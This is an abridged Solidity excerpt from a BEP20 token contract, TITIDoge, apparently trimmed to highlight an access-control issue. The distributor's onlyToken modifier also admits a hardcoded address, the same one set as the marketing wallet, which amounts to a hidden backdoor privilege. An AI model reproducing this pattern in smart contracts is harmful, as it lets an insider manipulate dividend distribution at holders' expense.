...
contract DividendDistributor is IDividendDistributor {
    ...
    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0xc99DBBA41a52C186D1a204A471fE1cB5fD83E95f)); _;
    }
...
contract TITIDoge is IBEP20 , Auth, BaseToken {
    ...
    constructor(
        ...
        marketingWallet = 0xc99DBBA41a52C186D1a204A471fE1cB5fD83E95f;  //marketingwallet
        another = [0xDA94EAD95ce744d2dA5f6D82Bb79EB3Dfd7F1594,0xA53BD524aa11A4aC12696885FD4f5b60cc00C9BA];     
